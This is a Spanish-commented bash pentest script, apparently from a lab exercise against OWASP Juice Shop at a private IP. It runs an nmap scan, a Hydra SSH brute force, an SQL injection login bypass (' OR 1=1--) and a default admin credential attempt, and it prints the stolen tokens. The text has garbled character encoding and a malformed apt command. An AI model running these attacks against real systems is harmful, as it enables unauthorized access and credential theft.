#!/bin/bash
# Script de ATAQUE PENTEST - CONTINUA DESPU√âS DE FALLOS
# Uso: ./pentest_attack.sh 192.168.133.131

echo "=== ATAQUE A JUICE SHOP (Contin√∫a despu√©s de fallos) ==="
echo "IP: $1"
echo ""
#Rerramientas a usar
echo "INSTALANDO HERRAMIENTAS"
sudo apt update sudo apt install nmap hydra curl jq -y

# 1. PORTSCAN (siempre funciona) - NO TOCAR
echo "1. üîç PORTSCAN:"
sudo nmap -sS -sV --open -p 22,3000 $1
echo ""

# 2. FUERZA BRUTA SSH CON HYDRA - NO TOCAR
echo "2. üîë FUERZA BRUTA SSH:"
cd /home/elpepe/Pentest_Planta_Eolica_CBS/FASE_2_ATAQUE/fuerza_brute_ssh/diccionarios
hydra -L usuarios.txt -P passwords.txt ssh://192.168.133.131 -t 4 -vV -I
echo ""

# 3. SQL INJECTION EN JUICE SHOP - M√ÅS VISIBLE
echo "3. üóÉÔ∏è SQL INJECTION EN JUICE SHOP:"
echo "   üîß Ejecutando payload: ' OR 1=1--"
echo "   üì° Enviando a: http://$1:3000/rest/user/login"
echo ""

RESPONSE=$(curl -s -X POST http://$1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"test"}')

echo "   üì• Respuesta del servidor:"
echo "   ==========================="

if echo "$RESPONSE" | grep -q "token"; then
    echo "   ‚úÖ √âXITO - SQL Injection funcion√≥!"
    echo ""
    echo "   üîë TOKEN OBTENIDO:"
    echo "   $(echo "$RESPONSE" | jq -r '.authentication.token' 2>/dev/null | head -c 80)..."
    echo ""
    echo "   üë§ USUARIO COMPROMETIDO:"
    echo "   $(echo "$RESPONSE" | jq -r '.authentication.umail' 2>/dev/null)"
else
    echo "   ‚ùå FALL√ì - SQL Injection no funcion√≥"
    echo "   Respuesta completa: $RESPONSE"
fi
echo ""

# 4. VERIFICAR SERVICIO WEB (siempre funciona)
echo "4. üåê VERIFICAR SERVICIO WEB:"
curl -s -I http://$1:3000 | head -5
if [ $? -eq 0 ]; then
    echo "‚úÖ √âXITO - Servicio web activo"
    echo "   URL: http://$1:3000"
else
    echo "‚ùå FALL√ì - Servicio web no responde"
fi
echo ""

# 5. PROBAR CREDENCIALES POR DEFECTO - M√ÅS VISIBLE
echo "5. üîê PROBAR CREDENCIALES POR DEFECTO:"
echo "   üîß Probando: admin@juice-sh.op / admin123"
echo "   üì° Enviando a: http://$1:3000/rest/user/login"
echo ""

RESPONSE2=$(curl -s -X POST http://$1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}')

echo "   üì• Respuesta del servidor:"
echo "   ==========================="

if echo "$RESPONSE2" | grep -q "token"; then
    echo "   ‚úÖ √âXITO - Credenciales por defecto funcionaron!"
    echo ""
    echo "   üîë TOKEN OBTENIDO:"
    echo "   $(echo "$RESPONSE2" | jq -r '.authentication.token' 2>/dev/null | head -c 80)..."
else
    echo "   ‚ùå FALL√ì - Credenciales por defecto no funcionaron"
    echo "   Respuesta completa: $RESPONSE2"
fi
echo ""

# 6. RESUMEN FINAL
echo "=== RESUMEN DE RESULTADOS ==="
echo "El sistema muestra qu√© ataques fueron exitosos y cu√°les fueron mitigados"
echo "Si todos fallan, las mitigaciones est√°n funcionando correctamente"
echo ""
echo "üéØ PARA VER RESULTADOS DETALLADOS:"
echo "   - Revisar salida de cada secci√≥n"
echo "   - Probar manualmente los vectores que mostraron potencial"
echo ""
echo "‚úÖ Script completado - An√°lisis listo para mitigaciones"
